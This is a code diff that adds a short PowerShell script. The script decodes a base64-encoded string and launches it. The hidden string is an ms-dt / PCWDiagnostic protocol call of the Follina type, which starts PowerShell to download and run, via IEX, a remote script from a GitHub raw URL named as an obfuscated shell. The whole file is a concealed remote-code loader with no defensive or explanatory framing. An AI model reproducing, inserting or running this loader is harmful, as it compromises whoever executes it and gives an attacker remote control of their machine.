@@ -1,0 +1,3 @@
+$encodedURL = "bXMtZHQ6Ly9pZCBQQ1dEaWFnbm9zdGljIC9za2lwIGZvcmNlIC9wYXJhbSAiSVRfU2VsZWN0UHJvZ3JhbT1Qb3dlclNoZWxsIC1jIElFWCBOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQuRG93bmxvYWRTdHJpbmcoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9MM0FDL3J2cy9yZWZzL2hlYWRzL21haW4vc2hlbGxfb2Z1c2NhZG8ucHMxJykpIg=="
+$decodedURL = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedURL))
+Start-Process $decodedURL
